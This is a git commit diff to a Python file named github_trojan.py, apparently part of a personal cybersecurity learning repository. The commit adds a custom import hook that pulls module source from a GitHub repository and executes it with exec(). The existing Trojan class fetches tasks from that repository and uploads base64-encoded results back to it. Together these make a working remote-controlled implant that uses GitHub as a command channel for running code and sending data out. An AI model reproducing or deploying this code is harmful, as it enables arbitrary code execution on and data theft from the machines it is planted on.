f300ecb45bbbd37f7c281658beb37c99656f8696
unknown <miketorii@gmail.com>
2025-05-25 01:39:42 +0000

    add import class

--- cybersecurity/github_trojan.py
+++ cybersecurity/github_trojan.py
@@ -12,6 +12,9 @@ from datetime import datetime
 import os
 from dotenv import load_dotenv
 
+################################################################
+#
+#
 def github_connect():
     print("---github connect---")
     user = os.getenv("USER_NAME")
@@ -24,11 +27,14 @@ def get_file_contents(dirname, module_name, repo):
     config_json = repo.file_contents(f'{dirname}/{module_name}').content
     return config_json
 
+################################################################
+#
+#
 class Trojan:
     def __init__(self, id):
         self.id = id
         self.config_file = f"{id}.json"
-        self.data_path = f"data/{id}/"
+        self.data_path = f"testdata001/{id}/"
         self.repo = github_connect()
 
     def get_config(self):
@@ -51,7 +57,7 @@ class Trojan:
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
-        remote_path = f"data/{self.id}/{message}.data"
+        remote_path = f"testdata001/{self.id}/{message}.data"
         print(remote_path)
         bindata = bytes("%r" % data, "utf-8")
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
@@ -61,9 +67,41 @@ class Trojan:
         config = self.get_config()
         for task in config:
             self.module_runner(task["module"])
+            
+################################################################
+#
+#
+class GitImporter:
+    def __init__(self):
+        self.current_module_code = ""
 
+    def find_module(self, name, path=None):
+        print("[*] Attempting to retrieve %s" % name)
+        self.repo = github_connect()
+
+        print(self.repo)
+        new_library = get_file_contents("cybersecurity", f'{name}.py', self.repo)
+        if new_library is not None:
+            self.current_module_code = base64.b64decode(new_library)
+            return self
+
+    def load_module(self, name):
+        print("----load_module----")
+        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
+
+        new_module = importlib.util.module_from_spec(spec)
+        exec(self.current_module_code, new_module.__dict__)
+        sys.modules[spec.name] = new_module
+        
+        return new_module
+        
+
+################################################################
+#
+#
 if __name__ == "__main__":
     load_dotenv(".env")
+    sys.meta_path.append(GitImporter())
     trojan = Trojan("abc")
     trojan.run()
 
